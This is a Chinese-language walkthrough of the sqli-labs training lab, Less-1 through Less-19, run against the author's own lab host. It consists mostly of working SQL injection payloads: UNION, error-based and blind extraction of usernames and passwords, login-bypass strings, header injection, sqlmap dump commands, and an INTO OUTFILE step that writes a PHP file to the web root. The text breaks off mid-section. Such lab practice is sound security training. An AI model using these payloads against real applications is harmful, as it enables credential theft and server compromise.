# Less-1 

**GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)**



### 方法一：**手工UNION联合查询注入**

1.判断是否能够注入

```
http://daishen.ltd:1112/Less-1/?id=1
```

2.判断表中存在几个字段

```
id=1' order by 3 --+
```

3.判断字段位置

```
id=1' and 1=2 union select 1,2,3 --+
```

4.爆所有库.

```
id=1' and 1=2 union select 1,database(),3 --+   查看当前库

id=1' and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+   查看所有库
```

5.爆指定库的所有表

```
id=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
或者
id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

6.爆指定表的所有字段

```
id=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
```

7.爆出字段内容

```
id=1' and 1=2 union select 1,username,password from users where id=1 --+

id=1' and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
```

### **方法二：手工报错型注入**

检测报错型payload

```
?id=1' and 1=1--+   //正确
?id=1' and 1=2--+   //失败
**注意id=正确值
```

爆表payload

```
http://daishen.ltd:1112//Less-1?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
```

（字段）payload

```
http://daishen.ltd:1112//Less-1?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+

```

爆值payload

```
http://daishen.ltd:1112//Less-1?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+
```

显然没有完全显示

```
http://daishen.ltd:1112//Less-1?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','Angelina')))) --+
```

### 方法三：使用sqlmap进行自动化攻击

扫描URL目标

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1"
```

查看所有库

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -dbs
```

查看所有表

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -D security --tables
```

查看表字段

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -D security -T users --columns
```

查看表字段内容

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -D security -T users --columns -C "username,password" -dump
```

进入sql-shell

```
 sqlmap -u "daishen.ltd:1112/Less-1/?id=1" --sql-shell
```

随机agent

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" --random-agent
```

多线程

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" --threads=4
```

导出HTTP详细请求

```
sqlmap -u "daishen.ltd:1112/Less-1/?id=1" -t http.log
```

# Less-2 

**GET - Error based - Intiger based (基于错误的GET整型注入)**



### 方法一：**手工UNION联合查询注入**

1.判断是否能够注入

```
http://daishen.ltd:1112/Less-2/?id=1
```

2.判断表中存在几个字段

```
id=1 order by 3 --+
```

3.判断字段位置

```
id=1 and 1=2 union select 1,2,3 --+
```

4.爆所有库.

```
id=1 and 1=2 union select 1,database(),3 --+   查看当前库

id=1 and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+   查看所有库
```

5.爆指定库的所有表

```
id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
或者
id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

6.爆指定表的所有字段

```
id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
```

7.爆出字段内容

```
id=1 and 1=2 union select 1,username,password from users where id=1 --+

id=1 and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
```

## 

# **Less-3 **

**GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)**



### 方法一：**手工UNION联合查询注入**

1.判断是否能够注入

```
http://daishen.ltd:1112/Less-3/?id=1
```

2.判断表中存在几个字段

```
id=1') order by 3 --+
```

3.判断字段位置

```
id=1') and 1=2 union select 1,2,3 --+
```

4.爆所有库.

```
id=1') and 1=2 union select 1,database(),3 --+   查看当前库

id=1') and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+   查看所有库
```

5.爆指定库的所有表

```
id=1') and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
或者
id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

6.爆指定表的所有字段

```
id=1') and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
```

7.爆出字段内容

```
id=1') and 1=2 union select 1,username,password from users where id=1 --+

id=1') and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
```

# **Less-4 **

**GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）**



### 方法一：**手工UNION联合查询注入**

1.判断是否能够注入

```
http://daishen.ltd:1112/Less-4/?id=1
```

2.判断表中存在几个字段

```
id=1") order by 3 --+
```

3.判断字段位置

```
id=1") and 1=2 union select 1,2,3 --+
```

4.爆所有库.

```
id=1") and 1=2 union select 1,database(),3 --+   查看当前库

id=1") and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+   查看所有库
```

5.爆指定库的所有表

```
id=1") and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
或者
id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

6.爆指定表的所有字段

```
id=1") and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
```

7.爆出字段内容

```
id=1") and 1=2 union select 1,username,password from users where id=1 --+

id=1") and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
```

# **Less-5 **

**GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)**



### **方法一：时间延迟型手工注入**

时间延迟型手工注入，正确会延迟，错误没有延迟。

判断表中存在几个字段

```
id=1' order by 3 --+
```

验证时间延迟型的盲注：

```
http://daishen.ltd:1112/sqli-labs-master/Less-5/?id=1' and sleep(5)--+
```

发现明显延迟，

爆库长payload经过几次尝试，发现数据库长度为8时有明显延迟5秒。

```
http://daishen.ltd:1112/Less-5/?id=1' and if(length(database())=8,sleep(5),1) --+
```

爆库名payload数据库第一个字符为s，加下来以此增加left(database(),字符长度)中的字符长度，等号右边以此爆破下一个字符，正确匹配时会延迟。最终爆破得到left(database(),8)='security'

```
http://daishen.ltd:1112/Less-5/?id=1' and if(left(database(),1)='s',sleep(5),1) --+		第一个字母为s

http://daishen.ltd:1112/Less-5/?id=1' and if(left(database(),2)='se',sleep(5),1) --+	第二个字母为e
```

爆表名payload

```
http://daishen.ltd:1112/Less-5/?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' ,sleep(5),1)--+

直接猜
?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),5)--+
```

爆列名payload

```
http://daishen.ltd:1112/Less-5/?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+
```

暴数据payload按照id排序，这样便于对应。注意limit 从0开始.坚持不懈的尝试

```
http://daishen.ltd:1112/Less-5/?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+

http://daishen.ltd:1112/Less-5/?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
```

需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。

### **方法二，布尔型手工注入**

在布尔型注入中，**正确会回显，错误没有回显**，以此为依据逐字爆破，

暴库payload

```
http://daishen.ltd:1112/Less-5/?id=1' and left((select database()),1)='s' --+

http://daishen.ltd:1112/Less-5/?id=1' and left((select database()),2)='se' --+
```

爆表paylaod

```
http://daishen.ltd:1112/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u' --+

http://daishen.ltd:1112/Less-5/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),2)='us' --+
```

爆列名payload

```
http://daishen.ltd:1112/Less-5/?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)='i' --+

http://daishen.ltd:1112/Less-5/?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 0,1),2)='id' --+
```

爆字段payload

```
http://daishen.ltd:1112/Less-5/?id=1' and left((select username from users limit 0,1),1)='d' --+
```

需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。

### 方法三：报错注入

爆库

```
?id=1' and extractvalue(1,concat(0x23,database(),0x23))--+
```

 爆表名

```
?id=1' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+

?id=1' and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x23))--+
```

爆列名

```
?id=1' and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),0x23))--+
```

爆数据

```
?id=1' and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+

?id=1' and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))--+
```

用limit 可以看所有的数据了。

双注入查询需要理解四个函数/语句

1. Rand() //随机函数

2. Floor() //取整函数

3. Count() //汇总函数

4. Group by clause //分组语句

# **Less-6** 

**GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)**



### **方法一：时间延迟型手工注入**

时间延迟型手工注入，正确会延迟，错误没有延迟。

判断表中存在几个字段

```
id=1" order by 3 --+
```

验证时间延迟型的盲注：

```
http://daishen.ltd:1112/sqli-labs-master/Less-5/?id=1" and sleep(5)--+
```

发现明显延迟，

爆库长payload经过几次尝试，发现数据库长度为8时有明显延迟5秒。

```
http://daishen.ltd:1112/Less-5/?id=1" and if(length(database())=8,sleep(5),1) --+
```

爆库名payload数据库第一个字符为s，加下来以此增加left(database(),字符长度)中的字符长度，等号右边以此爆破下一个字符，正确匹配时会延迟。最终爆破得到left(database(),8)='security'

```
http://daishen.ltd:1112/Less-5/?id=1" and if(left(database(),1)='s',sleep(5),1) --+		第一个字母为s

http://daishen.ltd:1112/Less-5/?id=1" and if(left(database(),2)='se',sleep(5),1) --+	第二个字母为e
```

爆表名payload

```
http://daishen.ltd:1112/Less-5/?id=1" and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' ,sleep(5),1)--+

直接猜
?id=1" and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),5)--+
```

爆列名payload

```
http://daishen.ltd:1112/Less-5/?id=1" and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+
```

暴数据payload按照id排序，这样便于对应。注意limit 从0开始.坚持不懈的尝试

```
http://daishen.ltd:1112/Less-5/?id=1" and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+

http://daishen.ltd:1112/Less-5/?id=1" and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
```

需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。

### **方法二，布尔型手工注入**

在布尔型注入中，**正确会回显，错误没有回显**，以此为依据逐字爆破，

暴库payload

```
http://daishen.ltd:1112/Less-5/?id=1" and left((select database()),1)='s' --+

http://daishen.ltd:1112/Less-5/?id=1" and left((select database()),2)='se' --+
```

爆表paylaod

```
http://daishen.ltd:1112/Less-5/?id=1" and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u' --+

http://daishen.ltd:1112/Less-5/?id=1" and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),2)='us' --+
```

爆列名payload

```
http://daishen.ltd:1112/Less-5/?id=1" and left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)='i' --+

http://daishen.ltd:1112/Less-5/?id=1" and left((select column_name from information_schema.columns where table_name='users' limit 0,1),2)='id' --+
```

爆字段payload

```
http://daishen.ltd:1112/Less-5/?id=1" and left((select username from users limit 0,1),1)='d' --+
```

需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。

### 方法三：报错注入

爆库

```
?id=1" and extractvalue(1,concat(0x23,database(),0x23))--+
```

 爆表名

```
?id=1" and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x23))--+

?id=1" and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x23))--+
```

爆列名

```
?id=1" and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),0x23))--+
```

爆数据

```
?id=1" and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+

?id=1" and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))--+
```

# **Less-7** 

**GET - Dump into outfile - String （导出文件GET字符型注入）**



小扩展：

```
winserver的iis默认路径c:\Inetpub\wwwroot

linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/html等

apache 就.../var/www/html，.../var/www/html/htdocs

phpstudy 就是...\PhpStudy20180211\PHPTutorial\WWW\

xammp 就是...\xampp\htdocs

load_file()导出文件

Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。
```

使用条件：

```
A、必须有权限读取并且文件必须完全可读
and (select count(*) from mysql.user)>0/* 如果结果返回正常,说明具有读写权限。
and (select count(*) from mysql.user)>0/* 返回错误，应该是管理员给数据库帐户降权

B、欲读取文件必须在服务器上

C、必须指定文件完整的路径

D、欲读取文件必须小于max_allowed_packet
```

在less-2直接注入拿到路径

```
http://daishen.ltd:1112/Less-2/?id=-1 union select 1,@@basedir,@@datadir --+
```

注入less-7

Payload

```
?id=1')) union select 1,2,'<?php phpinfo() ?>' into outfile "/usr/share/nginx/a.php"--+        写入木马
```

```
?id=1'))+UNION+SELECT * from security.users INTO OUTFILE "/var/www/html/users.txt"--+		导出数据
```

# **Less-8** 

**GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)**



判断报错

```
http://daishen.ltd:1112/Less-8/?id=1' and 1=1 --+

http://daishen.ltd:1112/Less-8/?id=1' and 1=2 --+
```

判断数据版本

```
http://daishen.ltd:1112/Less-8/?id=1' and left(version(),3)=5.5 --+
```

猜解库的长度

```
http://daishen.ltd:1112/Less-8/?id=1' and length(database())=8 --+
```

猜解库名

```
http://daishen.ltd:1112/Less-8/?id=1' and left((select database()),1)='s' --+

http://daishen.ltd:1112/Less-8/?id=1' and left((select database()),8)='security' --+
```

猜解表名

```
http://daishen.ltd:1112/Less-8/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users' --+
```

猜解字段名

```
http://daishen.ltd:1112/Less-8/?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)='i' --+
```

猜解记录

```
http://daishen.ltd:1112/Less-8/?id=1' and left((select username from users limit 0,1),1)='d' --+
```

# **Less-9** 

**GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)**



判断延时

```
http://daishen.ltd:1112/Less-9/?id=1' and sleep(3) --+
```

猜解库的长度

```
http://daishen.ltd:1112/Less-9/?id=1' and if(length(database())=8,sleep(3),1) --+
```

猜解库名

```
http://daishen.ltd:1112/Less-9/?id=1' and if(left((select database()),1)='s',sleep(3),1) --+
```

猜解表名

```
http://daishen.ltd:1112/Less-9/?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e',sleep(3),1) --+
```

猜解字段名

```
http://daishen.ltd:1112/Less-9/?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)='i',sleep(3),1) --+
```

猜解记录

```
http://daishen.ltd:1112/Less-9/?id=1' and if(left((select username from users limit 0,1),1)='d',sleep(3),1) --+
```

# **Less-10** 

**GET - Blind - Time based - double quotes (基于时间的双引号盲注)**



判断延时

```
http://daishen.ltd:1112/Less-10/?id=1” and sleep(3) --+
```

猜解库的长度

```
http://daishen.ltd:1112/Less-10/?id=1” and if(length(database())=8,sleep(3),1) --+
```

猜解库名

```
http://daishen.ltd:1112/Less-10/?id=1” and if(left((select database()),1)='s',sleep(3),1) --+
```

猜解表名

```
http://daishen.ltd:1112/Less-10/?id=1" and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e',sleep(3),1) --+
```

猜解字段名

```
http://daishen.ltd:1112/Less-10/?id=1" and if(left((select column_name from information_schema.columns where table_name='users' limit 0,1),1)='i',sleep(3),1) --+
```

猜解记录

```
http://daishen.ltd:1112/Less-10/?id=1" and if(left((select username from users limit 0,1),1)='d',sleep(3),1) --+
```

#  **Less-11** 

**POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)**



### 万能密码

这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：

```bash
mysql> select * from users where username = 'admin';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  8 | admin    | admin    |
+----+----------+----------+
```

因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：

```bash
# 注释掉 passwd 来登录
uname=admin'--+&passwd=&submit=Submit
uname=admin'#&passwd=&submit=Submit

# 注释后面语句 并 添加一个永真条件
uname=admin&passwd=1' or 1--+&submit=Submit
uname=admin&passwd=1'||1--+&submit=Submit
uname=admin&passwd=1' or 1#&submit=Submit
uname=admin&passwd=1'||1#&submit=Submit

# 闭合后面语句 并 添加一个永真条件
uname=admin&passwd=1'or'1'='1&submit=Submit
uname=admin&passwd=1'||'1'='1&submit=Submit
```

因为这是一个 POST 型的注入，那么 这里就再啰嗦一遍，走一遍详细的流程吧

### 联合查询注入

> POST 数据里面不能有 `+`，这里得手动转换为空格

```payload
uname=admin&passwd=1'union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&submit=Submit
```

暴表payload

```
uname=admin' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&passwd=admin&submit=Submit
```

暴字段

```
uname=admin' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+&passwd=admin&submit=Submit
```

暴内容

```
uname=admin' and 1=2 union select 1,group_concat(username,0x3a,password,0x23) from users --+&passwd=admin&submit=Submit
```

### extractvalue报错注入

爆库payload

```
uname=admin' and extractvalue(1,concat(0x7e,(select database()))) --+&passwd=admin&submit=Submit
```

爆表payload

```
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&passwd=admin&submit=Submit
```

爆列名payload

```
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+&passwd=admin&submit=Submit
```

爆值payload

```
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&passwd=admin&submit=Submit
```

### sqlmap

**加载目标**

可以直接将 Burpsuite 截取的数据包内容保持为文本格式 `test.txt`：

```http
POST /Less-11/ HTTP/1.1
Host: daishen.ltd:1112
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://daishen.ltd:1112/Less-11/
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Connection: close
Upgrade-Insecure-Requests: 1

uname=admin&passwd=2333&submit=Submit
```

然后直接使用 sqlmap 的 -r 参数来加载这个请求包：

```bash
sqlmap -r test.txt
```

也可以手动通过 `--data` 来对 POST 的数据包内容进行注入检测：

```bash
sqlmap -u "http://daishen.ltd:1112/Less-11/" --data="uname=admin&passwd=2333&submit=Submit"
```

实际上 `--data` 比较鸡肋，操作效率比较低，因为比较冷门，所有适合来炫耀自己会这个参数，这样对 sqlmap 不够了解的人 就会觉得很高大上。所以接下来都使用 `--data` 这个参数来进行注入 

**联合查询注入**

```bash
sqlmap -u "http://daishen.ltd:1112/Less-11/" --data="uname=admin&passwd=2333&submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=U -v 3
```

**报错注入**

```bash
sqlmap -u "http://daishen.ltd:1112/Less-11/" --data="uname=admin&passwd=2333&submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=B -v 3
```

**布尔盲注**

```bash
sqlmap -u "http://daishen.ltd:1112/Less-11/" --data="uname=admin&passwd=2333&submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=B -v 3
```

**延时盲注**

```bash
sqlmap -u "http://daishen.ltd:1112/Less-11/" --data="uname=admin&passwd=2333&submit=Submit" -p "uname" --dbms=MySQL --random-agent --flush-session --technique=T -v 3
```

# **Less-12**

 **POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)**



### 联合查询注入

> POST 数据里面不能有 `+`，这里得手动转换为空格

```payload
uname=admin&passwd=1")union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&submit=Submit
```

爆出位置

```
uname=0") union select 1,2 --+&passwd=admin&submit=Submit
```

暴库payload

```
uname=0") union select 1,database() --+&passwd=admin&submit=Submit
```

暴表payload

```
uname=admin") and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+&passwd=admin&submit=Submit
```

暴字段

```
uname=admin") and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' --+&passwd=admin&submit=Submit
```

暴内容

```
uname=admin") and 1=2 union select 1,group_concat(username,0x3a,password,0x23) from users --+&passwd=admin&submit=Submit
```

### extractvalue报错注入

爆库payload

```
uname=admin") and extractvalue(1,concat(0x7e,(select database()))) --+&passwd=admin&submit=Submit
```

爆表payload

```
uname=admin") and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&passwd=admin&submit=Submit
```

爆列名payload

```
uname=admin") and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+&passwd=admin&submit=Submit
```

爆值payload

```
uname=admin") and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&passwd=admin&submit=Submit
```

### 万能密码

```
# 注释掉 passwd 来登录
uname=admin")--+&passwd=&submit=Submit
uname=admin")#&passwd=&submit=Submit

# 注释后面语句 并 添加一个永真条件
uname=admin&passwd=1") or 1--+&submit=Submit
uname=admin&passwd=1")||1--+&submit=Submit
uname=admin&passwd=1") or 1#&submit=Submit
uname=admin&passwd=1")||1#&submit=Submit
```

# **Less-13** 

**POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)**



### extractvalue报错注入

爆库payload

```
uname=admin') and extractvalue(1,concat(0x7e,(select database()))) --+&passwd=admin&submit=Submit
```

爆表payload

```
uname=admin') and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&passwd=admin&submit=Submit
```

爆列名payload

```
uname=admin') and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+&passwd=admin&submit=Submit
```

爆值payload

```
uname=admin') and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&passwd=admin&submit=Submit
```

# **Less-14** 

**POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)**



### extractvalue报错注入

爆库payload

```
uname=admin" and extractvalue(1,concat(0x7e,(select database()))) --+&passwd=admin&submit=Submit
```

爆表payload

```
uname=admin" and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&passwd=admin&submit=Submit
```

爆列名payload

```
uname=admin" and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+&passwd=admin&submit=Submit
```

爆值payload

```
uname=admin" and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&passwd=admin&submit=Submit
```

# **less-15 **

**POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)**



### **方法一，时间延迟手工注入**

时间延迟测试payload

```
uname=admin' and sleep(5) --+&passwd=admin&submit=Submit
```

暴库长度payload

```
uname=admin' and if(length(database())=8,sleep(3),1) --+&passwd=admin&submit=Submit
```

暴库payload

```
uname=admin' and if(left(database(),2)='se',sleep(5),1) --+&passwd=admin&submit=Submit

uname=admin' and if(left(database(),8)='security',sleep(5),1) --+&passwd=admin&submit=Submit
```

爆表payload

```
uname=admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u',sleep(5),1) --+&passwd=admin&submit=Submit

uname=admin' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),1) --+&passwd=admin&submit=Submit
```

暴出列名

```
uname=admin' and if(left((select column_name from information_schema.columns where table_name='users' limit 0,1),2)='id',sleep(3),1) --+&passwd=admin&submit=Submit
```

暴值payload

```
uname=admin' and if(left((select username from users limit 0,1),1)='D',sleep(3),1) --+&passwd=admin&submit=Submit


me=admin' and if(left((select username from users limit 0,1),4)='Dumb',sleep(3),1) --+&passwd=admin&submit=Submit
```

### **方法二，布尔型手工注入**

判断数据库长度

```
uname=admin' and length(database())=8 --+&passwd=admin&submit=Submit
```

暴力破击数据库名

```
uname=admin' and left((select database()),1)='s' --+&passwd=admin&submit=Submit

uname=admin' and left((select database()),8)='security' --+&passwd=admin&submit=Submit
```

暴力破解表名

```
uname=admin' and left((select table_name from information_schema.tables where table_schema =database() limit 3,1),1)='u' --+&passwd=admin&submit=Submit

uname=admin' and left((select table_name from information_schema.tables where table_schema =database() limit 3,1),5)='users' --+&passwd=admin&submit=Submit
```

暴力破解列名

```
uname=admin' and left((select column_name from information_schema.columns where table_name ='users' limit 0,1),2)='id' --+&passwd=admin&submit=Submit
```

暴力破解字段

```
uname=admin' and left((select username from users limit 0,1),1)='D' --+&passwd=admin&submit=Submit
```

# **Less-16** 

**POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)**



### **方法一，时间延迟手工注入**

时间延迟测试payload

```
uname=admin") and sleep(5) --+&passwd=admin&submit=Submit
```

暴库长度payload

```
uname=admin") and if(length(database())=8,sleep(3),1) --+&passwd=admin&submit=Submit
```

暴库payload

```
uname=admin") and if(left(database(),2)='se',sleep(5),1) --+&passwd=admin&submit=Submit

uname=admin") and if(left(database(),8)='security',sleep(5),1) --+&passwd=admin&submit=Submit
```

爆表payload

```
uname=admin") and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u',sleep(5),1) --+&passwd=admin&submit=Submit

uname=admin") and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),1) --+&passwd=admin&submit=Submit
```

暴出列名

```
uname=admin") and if(left((select column_name from information_schema.columns where table_name='users' limit 0,1),2)='id',sleep(3),1) --+&passwd=admin&submit=Submit
```

暴值payload

```
uname=admin") and if(left((select username from users limit 0,1),1)='D',sleep(3),1) --+&passwd=admin&submit=Submit


uname=admin") and if(left((select username from users limit 0,1),4)='Dumb',sleep(3),1) --+&passwd=admin&submit=Submit
```

### **方法二，布尔型手工注入**

判断数据库长度

```
uname=admin") and length(database())=8 --+&passwd=admin&submit=Submit
```

暴力破击数据库名

```
uname=admin") and left((select database()),1)='s' --+&passwd=admin&submit=Submit

uname=admin") and left((select database()),8)='security' --+&passwd=admin&submit=Submit
```

暴力破解表名

```
uname=admin") and left((select table_name from information_schema.tables where table_schema =database() limit 3,1),1)='u' --+&passwd=admin&submit=Submit

uname=admin") and left((select table_name from information_schema.tables where table_schema =database() limit 3,1),5)='users' --+&passwd=admin&submit=Submit
```

暴力破解列名

```
uname=admin") and left((select column_name from information_schema.columns where table_name ='users' limit 0,1),2)='id' --+&passwd=admin&submit=Submit
```

暴力破解字段

```
uname=admin") and left((select username from users limit 0,1),1)='D' --+&passwd=admin&submit=Submit
```

### **方法三，歪门邪道：**

万能账号绕过密码验证：

```
admin")#
```

注入结束。

# **Less-17 **

**POST - Update Query- Error Based - String (基于错误的更新查询POST注入)**



使用updatexml（），它和extractvaule（）是亲兄弟

爆库payload

```
uname=admin&passwd=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) --+&submit=Submit
```

爆表名payload

```
uname=admin&passwd=admin' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+&submit=Submit
```

爆列名payload

```
uname=admin&passwd=admin' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+&submit=Submit
```

爆值payload

```
uname=admin&passwd=11'  and  updatexml(1,concat(0x7e,(select password from (select password from users limit 7,1) test ),0x7e),1) --+&submit=Submit
```

# **Less-18** 

**POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)**



爆库payload

```
User-Agent: ' and extractvalue(1,concat(0x7e,database())) and '
```

暴表payload

```
User-Agent: ' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and '
```

暴字段payload

```
User-Agent: ' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) and '
```

暴值payload

```
User-Agent: ' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) and '
```

未显示完全

```
User-Agent: ' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','Angelina')))) and '
```

# **Less-19** 

**POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)**



暴库payload

```
Referer: ' and extractvalue(1,concat(0x7e,database())) and '
```

暴表

```
Referer: ' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and '
```

暴字段

```
Referer: ' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) and '
```

暴值

```
